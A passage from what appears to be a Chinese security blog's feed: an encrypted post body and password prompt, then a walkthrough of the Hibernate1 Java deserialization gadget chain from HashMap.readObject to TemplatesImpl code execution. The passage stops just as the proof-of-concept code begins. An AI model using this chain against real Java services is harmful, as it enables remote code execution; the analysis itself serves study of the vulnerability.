aa13ebfa1365bf35b05116bc62749a2533838e16ceed0db4225a6031e97b367781a58f0fad7ddcbd8730a13aaa211b52471eee61ee9ac2e76d09cc685106a97c425fa2cc7fe08c51b74a6a9241f4d6be97d524638e51db3d6c43cb41a9bc21fdcacbb2c8619421ef3457548310efe2460a036000fc3bd21e71dfe53a5ba9b35285c4cd075c7068f57b8983ff8957f4071fa2fbe3000a0cb4428c9837b2d8ace7199e4acd4618733d637de5e262007acca871cf613ba20d3272754f2cfa24d230e4578af5eb44fae86f5ac0b89033b0fbf6c2e6209c6b27ff0fcd6985bf270f8cf5c86747b8721d4016157a3ac1314864b10c62c47077df49d089455124d1bef28e46c21293cbe6e12a15e4e944dc162058fa9078bfbbb24c6b2bd79886a9370feca9948d3c1ddbfd0d2b886c35469002f3c81f9089b8b9c898dfef7395142ff23b35fcea89323281398f4a38837c7d59c0acde7541c0401fe69b487d11709966ef725efae658f410e22a661259bfd20b53ef60fb788602c6a3ab9a777fb677a495e4776d12f74d7fcd2c680f6d7619b304840b47f4c9fd740203e877a9da9acbe61cc12d82725eabf7b58043a20e12967cab9bb7015f6c19ade5d69840f41910886d9ff82b22c00b470d6476081abdaa2d9adff7d18ba288e146c571b3ecb4067d2d7e647f31c32c7c1356bc7abd55d30ce2331136f8011c63eebbf076878f440679c058870bfbc8d9a7f99ed3069b13c6999df0f9a0adc30eaa7bcf3830db73f97f2fbe3cc8f48f02a533fb2668c88d812a2587b123770b30169140456b00852948d76df2198f95bd4f074ceb4c2b9679adb389f71ef51719ec51c2e492ea69f7e53d0e51b7047b90a00582669354df53deb55cb04b3783006391d147ef5bb315832313a68bfd5be728635fb5767315a5c7deedcc7bd2217bb51978e20165b9dc3dfa26ba74cd06ccc5b5bd4e753b7f0e6026422e46d4522524e9458b97d649d465e9fe84370bcbc32f14cadaa27dfee3dfffd28247272b36c61d14eba4b22094622d518cd2d5608e726464a6c0e6e51bc76f61924d6801974e1493a8c2ebd61cf4c0adfe7ab2df60d4c10a148bcb8aa2e58f58c3cdfed2975005a6f2152c7bc8362c77510ed42dc74432f54ef3563237c36efa0c44732e42c9b10f4c43f7ad6f8e7e9e3bb95c076243a18aef21c02d8a21fdaabfce2a88e6fcef43b7fd18ef5dfa94dad46bffdb7a2435c1d3e94032c0ea061e44aa95b4a2286a792a7874cc0c973ad12c202117e1fa6c8951478aabda04cb3f5322bdfd1dd9b69682ea13fbc09a13fdb007ec1c43d4ad9248a0d5dcb83832480247767c599ed594e59e1e5f67f75fb9ec131c81a3517142f5b30635df4ab40a9f45eb2393f5aab917dfbcd0353773b70b1b0dfe9004a7131924e1ea7ccd0164de28e296c0993d175fd68d5e80383108ebf85ece36a2b37b4da0717d5649ea0b5d9f49848f7040e209717fcaa3b4f0e1297f96b0e46390d7aeb47dccf318546cbf8460fb7d44cb8dab9c80cc6b4152f930971d382ea692c0fd5148037027ebf632fddc84241e66d682645df70acafd1825e272597c000f81fa3b0fba3ab26b2fe51a5b90557dbb7366b4c137d1b02965a669d5d932a5e13d56bbdedcb2febf8fed5f726d119f18707529f129fcdcc99afe79aaed3bb9358ad7bb7f204e8bea2bdc711deee45b619f484390398430f24bddfde84c7c10c8a24a0e2a84f8ff65173b36010c6cb2506e0e8c4884901b14182b6858d988ea86ab7ab602a71b2045ea8f44602cf1ff8e2454d81cc1a13a016d0f938d53c5d1fc25f75488918f3e2af1852ef6b25ffa01353983bf6538dc2809dd046cfaf1a6d7644e8986c9f7c534f510e2559105c47f37390b8dd3851f88201700c10c7287fd0211a9a3510916088ecb999372ab6218cc316843f84ea09328681bdaf1853752b465be1cf9be3535709ebe3d3e5c0624a7f9ecbbad97e717db3ea79da40d1d31e6ba8b33e8b5e7234e63575a23be6ebddcc25fff8c46dba2356fd3af4e9107375929d2563926adb9457ca743ecf431ff8069c7c985952abf6ca79656166fb734ca7273472826357a34690dffd03ffbaacc47ba0609ec58e87e1e88bb116e6164e689fa12c3044cb4cc6374bf623b8c5ca313b608dda2fd6c79a62eb426039c78f920e787f66bdea1534dd09d5479e3948973d0f9332119cc1278f327fd6435dac87bd4c5d6fef4e12f432f5ba9a2bf6046455dfe03004da963517ba0d2de04943bffbdc07d565d393ae79be8e3d3321404b8015240ac98787781eff9271b4a8c9b09c889936f6a883c9650f987bfa143f8fded577f83e3a1bd86fc80ffd71f9e2c8bbd1072a489fa29005431cfc2fe731a59c83ca0e6915e29c7f3f8c27f99d2368ad20a690916a91f2451ab3f5fb2416be734d1b37a4a07c9f329d45111bc1b7ea4196e9387bbf990375a7346163a511a0142ac44cd5a00855d4d2548d7b579eb9b60c6beaeaab9ebe606d676f2063114e3ec99072af1ad71a43ec4cf36ae4ea07fe4913c6e1e27a2ae41c8b4246024b37e676df2740f7df122e1a45b55d7c24815031128aad4935dfbe15dd1b736c56ee6fdc0c41a4e5421597d999778c863c1bb108292685bca375ef1fdae2e25118275d22bdbcfdb7ad40927708e9cb7f0897a664228863f5222f13c8408f13f4667cd2b7949abcac582758b218d592489a69aff70a7a099aa907fc363c73756f3efe047e989b167cfdafbe5b82cc56b5973249de285b7a99ec1296ee6ffaf8a42e93be67d106974d53009f846316c7897e1dc13119a73c591aaa3f19fad10f33c3c967f6f2c02f1482a320c633e9245c52a292f21c54252a9737703fac8572ef8334dd40fa866b3f870d32ff67bddcbb5376a48342e40213d706525d6dbdb9db0198c1f5a7cbbead179b557074fa1748884ccfa2c516113215390089843231f6787dbe76e8b156561672293964ea0c2fdf2c13af991576c1c1b6792c76f5a56375dd7b95c8cf15dd3c4652b690df58b87312ab607395de564e77f97c72a1bea321b88e5b262dc7d51075dcc9d999f69d21e1c31698eb3ec2f7b447f6bb073ae554269c57616864d33ffdfdb9bd14681767e2cd41d97a422d7cb1ca85e3dfb29d227f17f95a06b4cf6a9a280d4f2dc7020843790f3fb5ba8c6876a07bf79442ff5d840c74e80de751f3013e97a879f123606313f1995835178220028e55eaabd16227872da3b3a96246777fc07a814f6d677c8e11cf867457a8b79708869bd347848239c202ec8abf89a57e411644700cda384fc00cce28450c97a66f2cc2b8a00b580564a1b3282e44339c8fb3457a0e1348a8ef2087249db1e724c6f489d8c5bb606fc2478c93a6739604836eae087a6def1a8965b338a7a3416139c6e3fabd532543a63ebbc289e5a8f9dbb29003ceb58ef5b3d271fee44314b3c2e2e9404981616326d577fdc4fa6e4d04a030eb25e235ceb85972260bc74bdb1cfce7ba66147c44edaba5ab55a7b0948beb93f2762500ed989218b80c6d851acb7e098d53fea07df6f2dd1579250edb0d07c24a0c8ce1eb894482acd9e497ed8c0de4c06a3b0743f21d1e7aeb55add79da7c0be9fe2d12d739b9678eb914a008f3c0c1d403097f6d90c3d00efc57c0bd2e9910a4349f3356fbafa20f5f2e9fd09dd27248ba7acbdbb1f8912db42f9970a464a59c05efd21d516ed57210e860c229b46ae23e22e9b08d4217baca04dce6e2cd28602a6b5731408d5c48571b87887da6fc9d471dfdd085b29d4fdc5e92882476140142fd1258b7616fde5c9da3bb562f22b01d39f343c4898aeda655bc526ce58f59d0f1ea57fa6f2094be138e6268c6094e016f58312e91a94394a37f6c25d497181f72561ca39c988d01f400a07b1f0c096e6119dcbb76fd429aab19ff9fe39c96e96ccacbd8ee619f79cef12a051b59f5a77ba0746b6d2c269a5006e6cc55e43c5f25779d53da4b2c779d3563a6ad365e749c7e960c3385d614acd115695c6d9cdc7ef5bfd26a58c0974a5fe6f0a203c727e6c8427713e3b6b42619d6c59de951841b3f1cc404e642088b7ef4df8cf2defbd0e54ea5807d2b454cb5d0b097d658e0da13fba7004102a9825884e7ecd590d97c4403ead84f790d08716f526e1f7eb9aa65722b2a5b9387a9fc7ba3b37bf62c2fe19d65bc9299148ca1dada7ac3c73c135b681c8fd0dea86d6454190344f88a5c648357914afc9c1f7dc0807aad57bc5628e99fbcb97a49897d7e867a6d569604457657a3da1d54c062f22c7b40b54a61f6ba0298b9957c679934c3cfd24b7d6e9474de2b676f7ce71b1851c6176009c86bc68d3d0bce87f19ecea72e502e0b6e18db03d52a9bc1ce80ba4ef552a399822fa139838a185b2878d3c69f0da71c5903e3d09789c51f28d936c060c5661e3e4d33b281937d76d0cc9ba2af8aad488a4132d28b9f3402ca2aa64823d201f88abd2379de59acc6cd1bddc46269f751f5142de0835030ee8accd1a3c2b823a8afe6df012a452d37a10a54dc2c6fb49e985707dae032e4263c94b9fe16b68e4137733322f22bf1fa1d83d5a0d5cc2e7ef10dd27d68b38a68dbb5a2d0776218a8a2db6f4bff7ae4ef65ae696726b57d8ee383fd6ddca1b7f27dc51b6f2822896fac0fc448b9ecefb6d99f7f7246561cfe217857164fcaa1060930f0be11bfa68dd3a338e31af95dfdf8b4f1b810e8b659d8f9a4ed9f05d6aa267e630e107678f4bf037bec9669ee26f66b958de2118e20d9d6a42bebb4fac03d781074fb82e3ac108c466e5bb07989b42a29dec2cb62259a0bea5406aa9bbe87256416be91d4d603f3762a950f31db08398f61f59fb01b963798aaf1384b63b739c905c2ec4f30042ce1b35b544d18326ecf785461e116d40796010a189dbc74a31d0ca6d45cc5066b46dcf18090f8e561d0203a2a681521623b155c9213fd8455650b7159781dd677001482ae55d4fa35717a303da7c8c3dd5ce816b56dd3f30f288c8661c6c74da29269d1e4345ff78e28b93ef3d7bbda5852b3e7d66426c8a89b96109356343e6cff79e140b8336e7d651f458198958469b9ca7f0c706b2a8d33d62c83c577b64ff01ad280801fa6b2c47867407428117f006792406cf0013d59a3b7a4e6130a662fa7acd2bca78466378b45a4f05aec385815dda0bbdb4edeb14ebae9eadf0f3fdc17dbbb85d02e607de5ef423cd0fa737a8d79841d90c9461ec039c7bc13a7662354767a0fb16e43ff77a4f9bfbbc69f6f5c5149b3683a9dc29a641717b8f6068e965974c45feb226b627f873da007fb85483b20a3f11efa90e18fb7eb5ca0842c881075b12f54ec5aeca818317e6d8cd190101552335620733d04623b00dbc147e5e70406458f792ab7845fc153b85423b97c3cab5ca9a8952490ea3ef4db33248a5795ee146b127fcd649e2e2fb272e0d8c8fab785531cf97685ab5590900e27efec404a59db7803f3dd96d06e248c823f001ae9f757b51d193d2338ba5410c8c38f0cc0593db3b04b78aa507e962659d9a4ecbd292763d73bd733edcf8094a623717fe04295ad4a5a5e5f8f20472749038831801c625fb72fb0e366314442375d3825d1010136547a650ea67cb091017a0872e38366b9b9391f44911a3c78bbfb576f42db7f8876c449bc3242f1aec1b85f14bdc8eb7237bad74a76481addcbd20ba5287a23ec2934a5e14715d58f623d728e8ea06b721fdbbf2bfd74c7474742dc969bcf067e6e7fb0e9734ad8a6c96cbdc3a18f87dd4b6066f7ca2eb42635a1ed0daf23ec2d9f27bf021afb8b19a5185db335e3abffae98067f497a8d8704c102ef32deaa0c23d23b7a5560e04f1a5826864b2e93293962da71a66da18f02d8d8633a989bc46b0c27610a65d70b1743ed6de68045211f6845ffca147508dc98bb2ff8e98805d2723565d91f07b2217a52d8709f148e7f83d3a12212aa3dd0b3f8502ef4d01912cccfebb1cdbc3e8c4b393597be90cf4771001ce4ddc6a7f5829b224d8969aa979c64673627de5306c00133a59b886ce4e17fc2a0a9fe930fcf02e13dbb8908d42f4cc4f2ce7e70748fe43e08c267449ea67a66d53ee839a119dc0237a6d3b697ed274c3d15470a3649f32e1af48415ff7787c640754da2e96bd68707eb9cd82f7fb289e0c92e51557c9635ef89fec651c23ae27af23c729a3b95031126ec96402d23d98efc1090897eb279a2f50c789c39a7657751f9d8e7189b833c25a8a3f58b6b9eaa9a9585b3b55e06a73cf9f2b11a43dee720bc087a7ffb3fee2c6ead897d53aeecfe9fab7b52860f8a94abf8d65a2351bf995038f6d54aa783d01de1c2b15cdc5cabf51042ab4ae67bf8294d1c9156b2b86d05361999b765bdb179984d860230b97db42cad129b0b0eabe8343541a61834d4f3d183823623e6a5c521ae51dcdf5f261719be63304299178cc2d19ad87a9b2e51e8ff1ba71518b476ed9578648bb82492be7335f6b6f1263ce1bc32983b1c0b1caf8d6eb755efe0bff74aafc1622583c822eb200b06ca95889a4a491a0153688e62c2195301f3f04d0fbd8faf9de73f181a839fe17071e76f2af500d253d278b8ed336567f779edad98c0c02c6ef577289026401f2df23bd91d18918410e6d3614490ad3236ffad02542392bcc6ec3ae27e9ba4d3f41a4261f0b05896a5fa5ca66496266acbafed7c214550236cec09bf6d920c10c7ec381c5042956bca0112409c0ec64011f5eb0a0c0ec4cc33d3c8241b4ff8db5d9e42cea04d3ebd9f4bbdb15ab2b4683040716a46b27d91966a25d57206836d96ee13d2bfa623765e547a0faa540cff0304a81ab515ae65d9272a87688090630a890d3501c2982a08f4b8c6a3d2b79a4115a1c18595bfa27f43e328c7d43c6c11fceb6712d3df4e1b5473ed55e76fb6a61a770df52ff1d3cc39793367a881399c0269a0d911d2dcf6c66ea6d928bb8322fc243286ae18d2c444b2857a8142e41da7b11c99ed5b7832870685b0a19d8bd13ff3cc653f47e8c0a1bb9c83d3cc8ef86f62988c49f2d6b4430bd26830a3e88c4fb2529f0d6cf84532f30c45179ab85a141c91aa45ab1dea1897f430a89c7cbfb3c8d0d7f79e65a49c14ff3dee3faaf76203737ad5e3799029ef530f5c7a47dca89aa879d48a614ab950149818acae248a422105d76b495332ceffa4ea158e162379772f0102b55f31c19e693a37c9013af2b346b168f3c97deca19021396cb5445df26b0420751e34b20e06559834e7d093ecc0a528ddc0ed579f6c371599ba0d917a0e737f842a84f780294a8357f90b9b2f195f3aad7493978245c7c3af6e9c98f4bb61be530aefed48739a4716f7d4f490cbb5dea7ad2e91a5b0c79b15b58a2bb1c3fb206b25bdb51435a4eb1f16480c8b4538391735ec682ba64852f852d0dea9953d82b58b61d792a3a8924741db8b8784e2ae089e554f97a3504e14a69c774c23e2b96af5837a0f0837ffcdb09f7c3980a3d723ede3893843568fb4eab14d2312913b6046e3fc0e2188f6090e6517786f4b9eda882e1698ac9abab204995aa10777e307d7c93b38841e8c411b92d47bad43abab012175628636e490bbef93dedc6af354f924721cb37b4dc6dd1372a6576913009c233e358d46e560b7ab36bba824e89d8f5956374246e5c601e0715b387b22f082c838aa51c95bdd8fd755cd472eb14f56e708b5942211dc9bc0b6d06ed19cafe58c88217943aa48aaadcc882857ce49351741a4156a7b540257ab94ea8224d3e43ade28088633ccebab1a37e73655bae4c0c294b8b0c813b72f17dd337a1a7b63a6aa2bf535bbb22c7900fe151b46a5805c5ad73f09aed4aaaead8e01234ba7263bf657d09df9a3101cab73ab1c79e8681e785a71cc25df1252f01e677865913fc4f6e1a3773d4d71219bd3c82f7fb63163d5bc19717f9a59673475ad6ac93992454511ac8714c08c3b1ea59e962dee29a6163592dbe4bf862e1c731d9c0a5d113d6466108653bdce192a01e5f5302eca93a0fa8341c1b98bdd933a4081f5b06931ce531ab168380f6c3a4ad9c07482066b79e15c986961959a1b06b1156182c17756e16cbd3a41ebc0f8a95fcaaed15b8f8464fdf14f946a0e31d2091988a2405dc275153508c177a70a06b3bd1a4f5738a6524f5f0d3682feb06e5493bfb98c192c1d43fd05bd3dcce918ccfe00f185239bb563635107c82618e66705f0d0ba952414744238e89f9ea79068767bfca8d62c400c00ffb035d543f81313dbd4fe7e753c4fe53cb1418b930f32ffb8e9f32dd3cf5700520c031992a86dba5c902bd507e5e7b4a8a68d948f7c573458264bb518de75e19a58412ea4fcd6a7d6fac4c93ebb45db1d7058fd917a200748a90e5be6e96491e6c97a83295414c93511f7f5aa992eea6c94caa1f8167dcd5c9dade7feeee850c5f88cfb25da629bbe404f42ae75149b243968cc9df6947a658c080733e88ab085ed29eca85bf491021f3aace421f78b18b258497db28c804b6c09e49527dade87595668434beea689ec75d990145befba051e2fadf1dd8b5cd56d31b04bb64a990efea8766cb69641b30f78c420da71edff1bc5429c238a2e0a5bde60a3b24338d5913db128ab58a7439b60f6e4d0d072974b3a8239ccf467fe0fb2e3acaf09cc2641a8a475572463121a21e4695b73e320be1e91755f6b871b416f72c99be2efe613e5aac410f1774b93fc5713f97a608bd1c33dd6ec9ae02cee26b59fe6b79e9fb70b340ebd811ac7973fe3478845d8374ebe808455f212e7b5a175868438fba5b71c656b68092f6a646c29fb2d6d394fefc67553d942df19995c1d52e5b016101f1aa69782ae8f0b46a7ebc204351194dafd090e603a68c1aa79d2be7441c8437a84e6ea7450a39c19dffb0751fb4002e1c0dc2e5269a0691c0865186b5d36d9d56b851257612368e2d15b757a2fc60ea0609e258a24d980bb768f9d2a1ba879e497c7d94fc7d5fda9230bd37b662504cf6b8ccf1974633a0890707fe27f9f8bc1543a31c6529c5112a07bf33a309f74f5683f3e7eae5f5dbd2e1c656d7d6c8f6bf188f1bcea650d521418c47e21d16febc2e097901ef6755d946a2d399129557e75be0b7488a61934ae168c0e5aa9e13e1f22dbfdc3d13b463e2c2019d2dd1f7423329334a8135b2c5a51e4f33927bcb9a543cf0cee88cd7675229b0f0a1edc2744e511d22cd403f0432ad61ed44a090c2cea360f040460f3894a9e4640d754110427cd8a7d0f688bc9a21abe6adb3c3849f871ffb3caf80491788132cded9c9f1d2abdea527f3af93270d43bfbe76f3c584e4f09cde8966887ebf2b7f402fbde324af49782a06614607e4a87b79e475c44b2bdab312dbb3fd2d39b0b242820ffc24149bbdb27ffecb79338fa1a588643e66aebb9745a31b1e9ee1c211f67fcf30e65abb2e435a81a92992c923054ad43366673107d8b230214498cc321f7cbbb286efffea53f79bc4711e11a24dc129ca4e9a578981e0d2800c2640473a665b0b3ae0ed1d7a9e27ede9250e85cdc42a12f7faeb9260e06fb91702b0026438acc74699a2b2056862b863f0470a3602942d66138b09f21f7f24657fc8403a5f8bdecbd1b8f7700613ad8a7a538613f72ceedaa4f143c7a5e7e415797c41ce89c31c554b2269d676ea10ee402071c57f3deb8b75cb4de98fb233645b3645d0e1799fc29a26e174b92b1db55ee301b92e5fcc843594b62c5aae5950af6287e99f74ddc44e704b06995365f4be14ae4aab2b6cadc81b02c7de14dae8d55d996cc418bb4ea3f8527dfc0dbadfaa10daaa9ab43e0baba3bcbe3ed1ad1716ce7d31f8161b3aa589a3c15ef33358a5e111afa33cb4a72fa89a3785f62f94c9249b4b8ec0d877cebbae5ab2d1405739956f6914e7fa9d9d70841ecfb77057b0bd5b15958d8fa44ca94e82effe38fb95c16a8a51266fcc7c43b61a183746b22260e847808f44079b56b01567d14edfcd84932a4554ad6feb985d94ea0feeb47f201df968476cc1dc1c850626d57857090f15bc25fa034c38d445094fad441523bd10fb0762f1782999ab4766f366e205d076e37a92d08f33b45692534a3ed5089ba34a17b65f38c4bf51875b7a3fe80cd60ece847c2c22f01113537989cee3ed2788ef9bb1fdde7595038800d2f5b4483255ab354e1fc6e8459dd8ac567793a21f6cd38b94a1ab33a555c4ab066cffeec18b43a219237a7d862f93579fbe8a20d167288acdd5a33f502ae621ed9e6869eb7e26c57538650e0adfaea6e8ed8654a1649d4cf904fe1f2994f105341f8c225ab30ef647e9395acc5f3201773a9df156b5d2d645177a6dc3637b920b84c5accfad092fd2ce46093ab2fd99e294e56651c63b0a97d04b1f37c9ebf5200159b5a09e78a329c8960beddcc5a8f093e02cb2d0e73d44775630de9a1cba028afd9d6bcf077f56b6f3165505fd982dd606aaa7d1cab61d084c92de82e861c750a7492495a429c00733298f51468bff3bb68773fe893d0499ef92f92084edbcf7b0bed513c1cbdd9fd9ea2e73bea567eca97e71150e9f38302a7781608ca698981c2196423c39eb379f317393b37ec755a5a14006d33647c2f06ce9f3e52f1eb6a4d505ba1b980c1e72cf3a97dd6d98d1cda66a43951f6796222f6f7c24d3927c7fb25f208933decac45e2321a928f0bb4a59019810856d5afe753d440be394d3856e38c20336e566c953c0fe40c575593ad4517d759fe58985c3d0d8c3699be589b25bc9698de020f9452281694eb434bee144a4fd9644a48080dd3c4fd002d396f9e60f5c4bcf1cb7175eee5ae539aa757ee92a2c6961a084a9a1a1a3af9fd8ef4cc46968a3a31c6ede8b6ab7673833451081e5ae57e87ea81d521196f811187f1a321245633fe8e08b980ffd866a4fb14089852f85f6f5286fe0a387bdd41ff5f042d39fa3dc80d9d22a6159ea8d592f818cc8a92a2039cb7fd4c49326f92c1771636088df963824344d6e06a673f9a313ef5f056b3cdd7f7ec806ff0ef91a39cb8754e0171f31b922582daf1110528980d9b34dceeb205de660f434d8b4a06694282637e8f53e3276d60f3fbe1c62404d9cc97690f2d4160b01cc53ca6d6262da6af0fa013d9be2afa41ce92932191a7c9ff2b52cff871f696ff0c705f01f333cdf2cc961c83495b7894589d76775a6ee65a59c94410e6ccddc1e10ce2f2f91d9aa9497fce345422ea840</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-XXE" scheme="https://ke1nys.github.io/tags/show-XXE/"/>
    
  </entry>
  
  <entry>
    <title>java-Hibernate</title>
    <link href="https://ke1nys.github.io/posts/3531a825.html"/>
    <id>https://ke1nys.github.io/posts/3531a825.html</id>
    <published>2023-07-11T14:07:32.000Z</published>
    <updated>2023-07-19T11:38:38.086Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">参考链接1 </a>       <a href="https://su18.org/post/ysoserial-su18-3/#hibernate1">参考链接2</a></p><h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><p>这也是可以通过调用任意getter函数来进行代码执行的一个类</p><p><strong>首先先给上调用栈</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>我们还是老样子 从能够执行命令的地方开始分析</strong></p><p><code>BasicPropertyAccessor#get</code>  方法</p><p><img src="../images/image-20230711230854168.png" alt="image-20230711230854168"></p><p>这个的话是可以调用任意方法</p><p><strong>这里可控的两点就是<code>method</code>和这个<code>target</code>参数</strong></p><p><code>BasicPropertyAccessor#BasicGetter</code>  方法</p><p><img src="../images/image-20230711231133798.png" alt="image-20230711231133798"></p><p>这个类的构造方法是可以设置这个<code>method</code>方法的</p><p><code>BasicPropertyAccessor#creatGetter</code>  方法</p><p><img src="../images/image-20230711231410524.png" alt="image-20230711231410524"></p><p>跟进这个方法</p><p><code>BasicPropertyAccessor#getGetterOrNull</code>   方法</p><p><img src="../images/image-20230711231507249.png" alt="image-20230711231507249"></p><p>接着跟进这个方法</p><p><code>BasicPropertyAccessor#getterMethod</code>  方法</p><p><img src="../images/image-20230711231538300.png" alt="image-20230711231538300"></p><ul><li>首先第一步就是先获取到这个<code>theClass</code>这个类里的所有方法</li><li>然后判断这些方法是是否存在参数  如果存在参数的话就退出</li><li>接着就判断无参数的方法是否是<code>get</code>或者<code>is</code>开头的</li><li>如果满足以上条件的话就将get或is后面的东西转化为小写并返回</li></ul><p><img src="../images/image-20230711231914096.png" alt="image-20230711231914096"></p><p>在<code>BasicPropertyAccessor#getterMethod</code>执行完后  就会将method进行返回  然后就返回<code>BasicGetter</code>的构造方法  这样的话就给<code>method</code>给配置完成了</p><p><strong>知道上述的东西参数怎么配置完之后  我们就得找找谁能调用这个<code>get</code>方法</strong></p><p>经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p>​    <img src="../images/image-20230711232825523.png" alt="image-20230711232825523"></p><p>就是这两个方法</p><p><strong>接着找谁调用了<code>getPropertyValues</code>()方法，由于这是抽象类，因此该找实现类哪里调用了</strong></p><p><strong>但是抽象类我们无法调用，只能使用它的子类，</strong><code>AbstractComponentTuplizer</code> 有两个子类，一个是 <code>PojoComponentTuplizer</code>，一个是 <code>DynamicMapComponentTuplizer</code>，这对应着 <code>Hibernate</code> 的实体对象的类型，即 <code>pojo</code> 和 <code>dynamic-map</code>。<code>pojo</code> 代表将 <code>Hibernate</code> 类型映射为 Java 实体类，而 <code>dynamic-map</code> 将映射为 Map 对象。</p><p>这里选择 <code>PojoComponentTuplizer</code> 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getPropertyValues(Object component) <span class="keyword">throws</span> HibernateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (component == BackrefPropertyAccessor.UNKNOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.propertySpan];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.optimizer != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.optimizer.getAccessOptimizer() != <span class="literal">null</span> ? <span class="built_in">this</span>.optimizer.getAccessOptimizer().getPropertyValues(component) : <span class="built_in">super</span>.getPropertyValues(component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230712114037350.png" alt="image-20230712114037350"></p><p><strong>这里就是会调用到父类里的<code>getPropertyValues</code>方法</strong></p><p>而这个方法在<code>ComponentType</code>中又被调用</p><p><img src="../images/image-20230713002720265.png" alt="image-20230713002720265"></p><p>这里让<code>componentTuplizer</code>为<code>PojoComponentTuplizer</code>即可接上链子，而在该类的<code>getHashcode</code>方法中又调用了<code>getPropertyValue</code></p><p><img src="../images/image-20230713004928706.png" alt="image-20230713004928706"></p><p>此现在该着哪里可以接上<code>getHashcode</code>，这里就再正向分析一波，首先找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用<code>getHashcode</code>了的</p><p><img src="../images/image-20230713005144028.png" alt="image-20230713005144028"></p><p>那么就接着找谁调用了这个<code>initTransients</code>   这个方法</p><p><img src="../images/image-20230713005401438.png" alt="image-20230713005401438"></p><p>最后在这个<code>ValueHolder#getValue()</code>里带调用了这个<code>initialize</code>方法</p><p><strong>那么这个<code>getValue</code>方法是在这个<code>TypedValue#hashCode()</code>方法来调用</strong></p><p><img src="../images/image-20230713005511693.png" alt="image-20230713005511693"></p><p>（这个<code>this.hashcode</code>是在调用这个<code>initialize</code>的时候来给赋值的)</p><p><img src="../images/image-20230713005654920.png" alt="image-20230713005654920"></p><p><strong>那么我们现在就走到了<code>TypedValue#hashcode</code>这个方法这里了</strong></p><p><strong>那么有经验的师傅就能想到使用<code>hashMap</code>来当入口来触发了</strong></p><p><strong>(就是最外层就是<code>hashMap</code>)</strong></p><p><strong>POC如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 